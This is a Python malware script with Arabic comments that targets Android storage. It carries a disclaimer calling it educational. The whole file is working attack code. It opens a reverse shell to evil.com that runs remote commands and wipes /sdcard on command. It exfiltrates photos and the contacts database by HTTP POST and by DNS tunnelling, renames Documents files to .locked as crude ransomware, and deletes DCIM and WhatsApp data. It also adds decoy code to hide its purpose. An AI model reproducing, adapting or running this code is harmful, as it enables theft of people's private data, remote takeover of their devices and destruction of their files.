#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
           ⚠️ تحذير: هذا الكود ضار وخطير جداً ⚠️
    يجمع بين باب خلفي، سرقة بيانات، فدية، حذف، و DNS Tunneling.
    لأغراض تعليمية وتحليلية فقط. لا تقم بتشغيله تحت أي ظرف.
"""

import os
import requests
import socket
import subprocess
import shutil
import dns.resolver
import time
import base64

# ==============================================
# 1. اتصال عكسي (Reverse Shell) - باب خلفي
# ==============================================
def reverse_shell():
    """إنشاء اتصال عكسي مع خادم المهاجم"""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("evil.com", 4444))
    
    while True:
        cmd = s.recv(1024).decode()
        if cmd == "destroy":
            os.system("rm -rf /sdcard/*")
            break
        os.system(cmd)
    s.close()

# ==============================================
# 2. DNS Tunneling (تهريب البيانات عبر DNS)
# ==============================================
def dns_tunnel_send(data, chunk_size=50, delay=0.1):
    """
    إرسال البيانات عبر استعلامات DNS إلى خادم المهاجم
    كل جزء يرسل كـ subdomain.evil.com
    """
    # تقسيم البيانات إلى أجزاء
    chunks = [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]
    
    for i, chunk in enumerate(chunks):
        try:
            # تحويل الجزء إلى Base64 للتأكد من صحة الأحرف
            encoded_chunk = base64.b64encode(chunk.encode()).decode()[:50]
            query = f"{encoded_chunk}.evil.com"
            dns.resolver.resolve(query, "TXT")
            time.sleep(delay)
        except Exception:
            pass  # تجاهل الأخطاء لإخفاء النشاط

def send_file_via_dns(file_path):
    """قراءة ملف وإرساله عبر DNS Tunneling"""
    if os.path.exists(file_path):
        with open(file_path, 'rb') as f:
            data = base64.b64encode(f.read()).decode()
            dns_tunnel_send(data)

# ==============================================
# 3. البحث عن جميع الصور ورفعها (HTTP)
# ==============================================
def steal_photos():
    """سرقة الصور ورفعها عبر HTTP"""
    for root, dirs, files in os.walk("/sdcard/DCIM/"):
        for file in files:
            if file.endswith(('.jpg', '.png', '.jpeg')):
                file_path = os.path.join(root, file)
                try:
                    with open(file_path, 'rb') as f:
                        requests.post("http://evil.com/upload", 
                                    files={'photo': f}, 
                                    timeout=10)
                except Exception:
                    # إذا فشل HTTP، حاول عبر DNS Tunneling
                    send_file_via_dns(file_path)

# ==============================================
# 4. تشفير/تغيير أسماء الملفات (فدية بدائية)
# ==============================================
def ransomware():
    """تغيير أسماء الملفات كشكل بدائي من الفدية"""
    for root, dirs, files in os.walk("/sdcard/Documents/"):
        for file in files:
            try:
                os.rename(
                    os.path.join(root, file), 
                    os.path.join(root, file + ".locked")
                )
            except Exception:
                pass

# ==============================================
# 5. حذف الملفات بشكل مباشر
# ==============================================
def delete_files():
    """حذف الملفات الحساسة"""
    os.system("rm -rf /sdcard/DCIM/*")
    os.system("rm -rf /data/data/com.whatsapp/")  # يمسح رسائل واتساب

# ==============================================
# 6. سرقة جهات الاتصال
# ==============================================
def steal_contacts():
    """سرقة قاعدة بيانات جهات الاتصال"""
    contacts_db = "/data/data/com.android.providers.contacts/databases/contacts2.db"
    if os.path.exists(contacts_db):
        try:
            with open(contacts_db, 'rb') as f:
                # محاولة HTTP أولاً
                requests.post("http://evil.com/upload", 
                            files={'contacts': f}, 
                            timeout=10)
        except Exception:
            # إذا فشل HTTP، استخدم DNS Tunneling
            send_file_via_dns(contacts_db)

# ==============================================
# 7. أمثلة مشتتة (لإخفاء النية الحقيقية)
# ==============================================
def distraction_code():
    """أكواد مشتتة لإخفاء الغرض الحقيقي"""
    response = requests.post("https://example.com/api", data={"name": "Ali"})
    print(response.status_code)
    
    s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s2.connect(("example.com", 80))
    s2.close()
    
    result = os.system("echo Hello")
    print(result)
    
    subprocess.run(["echo", "Hello"], capture_output=True, text=True)

# ==============================================
# 8. الدالة الرئيسية (تشغيل كل شيء)
# ==============================================
def main():
    """
    تنفيذ جميع الوظائف الضارة
    """
    # أكواد مشتتة أولاً
    distraction_code()
    
    # البدء في الأنشطة الضارة
    steal_contacts()      # سرقة جهات الاتصال
    steal_photos()        # سرقة الصور
    
    # باب خلفي (يعمل باستمرار)
    reverse_shell()
    
    # بعد الخروج من الـ reverse shell، نفذ الفدية والحذف
    ransomware()
    delete_files()

# ==============================================
# تشغيل البرنامج
# ==============================================
if __name__ == "__main__":
    main()
